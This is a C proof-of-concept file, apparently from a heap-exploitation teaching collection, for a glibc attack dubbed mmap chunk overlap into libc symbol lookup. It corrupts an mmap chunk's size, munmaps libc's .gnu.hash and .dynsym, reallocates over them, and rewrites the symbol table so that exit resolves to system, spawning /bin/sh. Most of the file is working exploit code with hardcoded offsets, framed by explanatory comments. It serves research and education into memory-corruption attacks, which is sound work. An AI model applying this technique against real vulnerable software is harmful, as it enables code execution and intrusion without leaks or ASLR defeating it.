#include <stdlib.h>
#include <stdio.h>
#include <stdint.h> 

/*
Technique should work on all versions of GLibC. However, the offsets 
used are specific for this particular compilation of GLibC 
and for the exit function.

Compile: `./compile.sh`
- Compiles AND sets the loader to the proper location

POC written by Maxwell Dulin (Strikeout) 
For a step by step on how this works, please visit the following link:
- https://maxwelldulin.com/BlogPost?post=6967456768.

*/
int main(){
	/*
	A primer on Mmap chunks in GLibC
        ==================================
        In GLibC, there is a point where an allocation is so large that malloc
        decides that we need a seperate section of memory for it, instead 
        of allocating it on the normal heap. This is determined by 
	the mmap_threshold. 

        Instead of the normal logic for getting a chunk, the system call *Mmap* is 
        used. This allocates a section of virtual memory and gives it back to the user. 

        Similarly, the freeing process is going to be different. Instead 
        of a free chunk being given back to a bin or to the rest of the heap,
        another syscall is used: *Munmap*. This takes in a pointer of a previously 
        allocated Mmap chunk and releases it back to the kernel. 

        Mmap chunks have special bit set on the size metadata: the second bit. If this 
        bit is set, then the chunk was allocated as an Mmap chunk. 

        Mmap chunks have a prev_size and a size. The *size* represents the current 
        size of the chunk. The *prev_size* of a chunk represents the left over space
        from the size of the Mmap chunk (not the chunks directly belows size). 
        However, the fd and bk pointers are not used, as Mmap chunks do not go back 
        into bins, as most heap chunks in GLibC Malloc do. Upon freeing, the size of 
        the chunk must be page-aligned.

        For more information on mmap chunks in GLibC, read this post: 
        http://tukan.farm/2016/07/27/munmap-madness/


        A primer on Symbol Lookup in GLibC
        ======================================
        There is some black magic that is constantly happpening that we do not even 
        realize! When we include functions (from a library) this is loaded into 
        its own object file and there is just a reference to some function that our 
        program does not even know about! Printf is not written within our executable.
        its written with GLibC. So, why? 

        Including EVERY function/symbol from GLibC into our little program would 
       	be terribly inefficient. Our little C program does not use EVERY single 
        function in LibC. Additionally, several other programs are likely to use GLibC
        throughout the execution of our program. So, the main goal of this dynamic symbol 
        table lookup is to shrink the size of an executable and promote reuseability. 
        But how does this work? 
        
        There are two major parts to this:
        1. The PLT/GOT setup within the binary 
        2. The symbol lookup within the library 
        
        
        First, at linking time (the code has been started, as an executable, but is
        altering the binary in order to make it deal with the environment). At linking
        time the functions (i.e. printf) is pointed to a stub called the *PLT* or 
        procedure linkage table. The PLT is simply code in place of our actual function.
        The first time this is called, a lookup is done in the *GOT* or global offset 
        table. The GOT stores the actual locations of symbols in external libraries. 
        However, because this is the first time, we do not know where the symbol is. 
        We would now pass execution to the next step (dynamic symbol lookup). If it was
        after the first time though, the value in the GOT is used when the PLT stub is 
        called to call our function. For more information on the PLT/GOT, go to 
        https://www.technovelty.org/linux/plt-and-got-the-key-to-code-sharing-and-dynamic-libraries.html

        Secondly, is the symbol lookup. This only occurs on the first time that a symbol 
        is attempted to be accessed. Execution is passed to the loader/linker for
        a short period of time during the PLT stub. At this point, the loader/linker 
	code scans through all object files that have been loaded into memory, 
	looking for a particular symbol. If the proper symbol is found, then the address 
	of the symbol is written back to the GOT. 

        In reality, this is much more complicated with hashing and bloom filters. But, 
        this will work as an overview.
        For more information on the symbol lookup process within GLibC, go to 
        https://www.bottomupcs.com/libraries_and_the_linker.xhtml and 
        https://blogs.oracle.com/solaris/gnu-hash-elf-sections-v2. 
        
        Primer on the Attack 
        =========================       
        After learning all about Mmap chunks and the symbol lookup process you are ready 
        to learn about this crazy attack method!
        Our goal is to overwrite parts of the symbol lookup process within LibC. Then, 
        point the symbol lookup to an unintended function that gains us code execution, 
        such as *system*. Once the symbol is returned, we have altered the execution 
        of the function by altering the symbol lookup!
        
        Here are the steps for the attack: 
        1. Overwrite/change chunk size of an mmap chunk via buffer overflow or bad indexing.
        2. Force munmap of bottom of LibC binary and other malloc chunks.
                - This frees the bottom of the LibC binary, allowing for this 
                  to be allocated back to a user.
        3. Get malloc chunk with part of the LibC binary in it via very large mmap call.
        4. Rewrite the symbol look up process. In particular, rewrite the following:
                - Hashing and bucket system
                - Symbol table entry for unresolved function
        5. Call the function that has not been resolved 
                - Pop shell :)

        The most stunning part of this attack is that it DOES NOT require ANY memory leaks. 
        ASLR does not affect this exploitation at all because the large malloc allocation 
	is directly under LibC everytime. Additionally, no pointers need to be overwritten
	for this attack to work.


        This attack is based upon the Qmail attack is based upon the idea at
        https://www.qualys.com/2020/05/19/cve-2005-1513/remote-code-execution-qmail.txt. 
        Although they do not explain the exploitation process in full, they mention 
        this interesting technique that I thought should be more thoroughly explained. 

	*/

	clearenv(); // Need to not crash once the shell is popped on a different system
	int d; 
	while(1){
		printf("Press enter to continue: \n"); 
		if(getchar() == '\n'){
			break;
		}
	}

	int* ptr1 = malloc(0x10); 

	printf("Extremely large chunks are special because they are allocated in their own mmaped section\n");
	printf("of memory, instead of being put onto the normal heap.\n");
	puts("=======================================================\n");
	printf("Allocating two extremely large heap chunks of 0x100000 each\n\n");
	
	
	// After this, all chunks are allocated downwards in memory towards the heap.
	long long* mmap_chunk_1 = malloc(0x100000);
	printf("The first malloc chunk goes below LibC: %p\n", mmap_chunk_1);

	long long* mmap_chunk_2 = malloc(0x100000);
	printf("The second malloc chunk goes below the first malloc chunk: %p\n", mmap_chunk_1);

	printf("\nSystem Memory Layout \n" \
"================================================\n" \
"heap\n" \
"....\n" \
"second large malloc chunk\n" \
"first large malloc chunk\n" \
"LibC\n" \
"....\n" \
"ld\n" \
"===============================================\n\n" \
);
	
	printf("Prev Size of second chunk: 0x%llx\n", mmap_chunk_2[-2]);
	printf("Size of third chunk: 0x%llx\n\n", mmap_chunk_2[-1]);

	printf("Change the size of the second chunk to overlap with the first chunk and LibC\n");	
	printf("This will cause both chunks to be Munmapped and given back to the system\n");

	int libc_to_overwrite = 0x15000; // Enough to munmap .dynsym and .gnu.hash

	// The size of the two previous chunks added together
	int fake_chunk_size = (0xFFFFFFFFFD & mmap_chunk_2[-1]) + (0xFFFFFFFFFD & mmap_chunk_1[-1]); 	
	// Amount of bytes of libc to overwrite, with the mmap bit set for the chunk
	fake_chunk_size += libc_to_overwrite | 2;

	// Vulnerability!!! This could be triggered by an improper index or a buffer overflow from a chunk further below it.
	mmap_chunk_2[-1] = fake_chunk_size;

	printf("New size of second malloc chunk: 0x%llx\n", mmap_chunk_2[-1]);
	printf("Free the second chunk, which munmaps the second chunk, first chunk and part of LibC\n\n");

        printf("Although the entire beginning section if marked executable, a large portion is just text\n");
        printf("In particular, the .dynsym & .gnu.hash are munmapped\n");
	/*
        This next call to free is actually just going to call munmap on the pointer 
	we are passing it. The source code for this can be found at 
	https://elixir.bootlin.com/glibc/glibc-2.26/source/malloc/malloc.c#L2845

        With normal frees the data is still writable and readable (which creates a use 
	after free on the chunk). However, when a chunk is munmapped, the memory is given 
	back to the kernel. If this data is read or written to, the program automatically 
	crashes. 
        
        Because of this added restriction, the main goal is to get the memory back 
	from the system to have two pointers assigned to the same area in memory.
	In this case, have an mmap chunk overlapping with LibC. 

        Additionally, because we are about the munmap several sections of LibC, we cannot 
        access functions/symbols that we have not called before. This is because the 
        locations where this data is stored are currently not available for the symbol 
	loading process. 

	*/
	// Munmaps both the first and second pointers and part of LibC (.gnu.hash and .dymsym) 
	free(mmap_chunk_2); 

	/* 
	Would crash, if on the following:
	mmap_chunk_2[0] = 0xdeadbeef;
	This is because the memory would not be allocated to the current program.
	*/

	/*
	Allocate a very large chunk with malloc. This needs to be larger than 
	the previously freed chunk because the mmapthreshold has increased. 
	If the allocation is not larger than the size of the largest freed mmap 
	chunk then the allocation will happen in the normal section of heap memory.
	*/	
	printf("Get a very large chunk from malloc\n");
	printf("This should overlap over the previously munmapped/freed chunks\n");
	uint8_t*  overlapping_chunk = malloc(0x300000);
	printf("Overlapped chunk Ptr: %p\n", overlapping_chunk);
	printf("Overlapped chunk Ptr Size: 0x%llx\n", (long long) overlapping_chunk[-1]);

	printf("\n\nStart overwritting process of .gnu.hash and .dynsym sections\n");
	printf("=============================================================\n");
	// Distance between .dynsym base and exit symbol table entry
	int libc_exit_dynsym = 0xc00; // In amount of bytes
	int libc_system_offset = 0x0459e7; // Offset from LibC base to system

	/*
	All of the offsets (shown below) are RELATIVE to the beginning of LibC. 

	Additionally, if an array is being indexed, this is INCLUDED in the offset below. 
	This is the actual spot being written to, not the offset to the array. This
	was done in order to make the POC simpler to read but should be considered
	when attempting to write a POC. 
	*/
	// .gnu.hash offsets and .dynsym offsets for where the data is stored at. 
	int gnu_bitmask_offset = 0x4070; 
	int gnu_bucket_offset = 0x4198; 
	int gnu_chain_zero_offset = 0x5264; 
	int symbol_table_offset = 0x81f0; 

	// Important values that need to set in order for this to work
	long long hash_value = 0xf000028c0200130e; 
	long long bucket_value = 0x86; 
	long long chain_zero_value = 0x7c967e3e7c93f2a0; 

	
	// Pointer to the beginning of the LibC object file (prior to munmap)	
	uint8_t* elf_header_ptr = overlapping_chunk + (0x2ec000 - 0x10); 
	printf("Elf Header Ptr: %p\n", elf_header_ptr);
	elf_header_ptr[0] = 0x41; // Not needed but nice reference point

	uint8_t* elf_bitmask_ptr = elf_header_ptr + gnu_bitmask_offset; 
	printf("Elf BitMask Ptr: %p\n", elf_bitmask_ptr); 

	uint8_t* elf_bucket_ptr = elf_header_ptr + gnu_bucket_offset; 
	printf("Elf Bucket Ptr: %p\n", elf_bucket_ptr);

	uint8_t* elf_chain_zero_ptr = elf_header_ptr + gnu_chain_zero_offset; 
	printf("Elf Chain Zero Ptr: %p\n", elf_chain_zero_ptr);


	// Begin WRITING the values
	
	printf("Setting bitmap value\n");
	// Set the bitmap
	*((long long *) elf_bitmask_ptr) = hash_value; 

	printf("Setting bucket value\n");
	// Set the bucket to be used
	*((long long *) elf_bucket_ptr) = bucket_value;
	/*
	Hasharr: 
	- This may need MULTIPLE writes in order to go through the iterator completely. 
	- For this case, only a single write was needed though.
	*/
	printf("Setting chain_zero value\n");
	// Set the hasharr to use
	*((long long*) elf_chain_zero_ptr) = chain_zero_value;


	// Symbol table entry pointing to the exit entry 
	uint8_t* symbol_table_ptr = elf_header_ptr + symbol_table_offset;
	printf("Symbol table ptr: %p\n", symbol_table_ptr);

	printf("Setting symbol table values\n");
	// Setting the values of the symbol table for exit
	int* symbol_table_exit = (int *)symbol_table_ptr; 

	symbol_table_exit[0] = 0x2f9d; 
	symbol_table_exit[1] = 0x00100012; 
	printf("Setting symbol table offset to point to system instead of exit"); 
	symbol_table_exit[2] = libc_system_offset; // Value of the offset to system
	symbol_table_exit[3] = 0x0;  // st_other
	symbol_table_exit[4] = 0x20; // st_size

	printf("\nIf all goes well, popping a shell :)\n");
	// Pop a shell :)
	exit((long long)"/bin/sh");
}
